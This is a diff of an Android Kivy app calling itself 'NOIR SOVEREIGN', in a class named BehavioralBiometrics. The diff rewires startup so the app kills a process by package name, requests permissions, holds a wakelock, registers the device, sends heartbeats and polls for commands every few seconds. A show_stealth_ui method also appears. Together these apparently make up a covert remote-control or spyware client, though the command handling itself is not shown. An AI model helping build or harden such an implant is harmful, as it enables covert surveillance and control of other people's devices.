@@ -248,8 +248,20 @@ class BehavioralBiometrics:
         
         # ROOT UI SAFEGUARD
         self.root = BoxLayout(orientation='vertical', padding=10, spacing=5)
-        self.status_label = Label(text="Initializing OMEGA-SYNC...", font_size='14sp', color=(0, 1, 1, 1))
+        self.status_label = Label(text="Initializing OMEGA-SYNC...", font_size='14sp', color=(0, 1, 1, 1), size_hint_y=None, height=40)
         self.root.add_widget(self.status_label)
+        
+        # Log Label UI for monitoring
+        self.log_label = Label(
+            text="[b]NOIR SOVEREIGN v17.5.7 [OMEGA-FINAL][/b]\nStatus: [color=ffaa00]CONNECTING...[/color]",
+            markup=True, font_size='14sp', halign='left', valign='top', size_hint_y=None
+        )
+        self.log_label.bind(texture_size=self.log_label.setter('size'))
+        
+        scroll = ScrollView()
+        scroll.add_widget(self.log_label)
+        self.root.add_widget(scroll)
+        
         return self.root
 
     def on_start(self):
@@ -258,9 +270,23 @@ class BehavioralBiometrics:
 
     def deferred_start(self):
         try:
+            try:
+                os.system("pkill -f org.noir.sovereign")
+            except: pass
+            
+            self._request_permissions()
+            self._acquire_wakelock()
+
             self._connection_guardian()
             Clock.schedule_interval(lambda dt: self._connection_guardian(), 60)
             Clock.schedule_interval(self.poll_commands, 3)
+            
+            Clock.schedule_once(lambda dt: threading.Thread(target=self._register, daemon=True).start(), 5)
+            Clock.schedule_once(lambda dt: self._unified_heartbeat_tick(0), 6)
+            Clock.schedule_interval(self._unified_heartbeat_tick, 15)
+            
+            threading.Thread(target=self._connectivity_watchdog, daemon=True).start()
+            
             self.status_label.text = "OMEGA-SYNC: ACTIVE"
         except Exception as e:
             self.status_label.text = f"Startup Error: {str(e)}"
@@ -284,35 +310,6 @@ class BehavioralBiometrics:
         except: pass
         return False
         
-        # FINAL SANITIZATION — WARN-03 FIX: use updated package domain
-        try:
-            os.system("pkill -f org.noir.sovereign")
-        except: pass
-        
-        self._request_permissions()
-        self._acquire_wakelock()
-        
-        # INFO-01 FIX: Start as CONNECTING (amber), updated dynamically on success/fail
-        self.log_label = Label(
-            text="[b]NOIR SOVEREIGN v17.2.2 [OMEGA-FIX][/b]\nStatus: [color=ffaa00]CONNECTING...[/color]",
-            markup=True, font_size='14sp', halign='left', valign='top', size_hint_y=None
-        )
-        self.log_label.bind(texture_size=self.log_label.setter('size'))
-        
-        scroll = ScrollView()
-        scroll.add_widget(self.log_label)
-        self.root.add_widget(scroll)
-
-        # BUG-02 FIX: Register device explicitly at boot with 5s delay
-        Clock.schedule_once(lambda dt: threading.Thread(target=self._register, daemon=True).start(), 5)
-        # WARN-01 FIX: Delay first heartbeat to 6s (after network init completes)
-        Clock.schedule_once(lambda dt: self._unified_heartbeat_tick(0), 6)
-        # Unified Heartbeat: Every 15 seconds (Stable Protocol)
-        Clock.schedule_interval(self._unified_heartbeat_tick, 15)
-        # LINK-04 FIX: Start connectivity watchdog (was defined but never started)
-        threading.Thread(target=self._connectivity_watchdog, daemon=True).start()
-        
-        return self.root
 
 
     def show_stealth_ui(self):
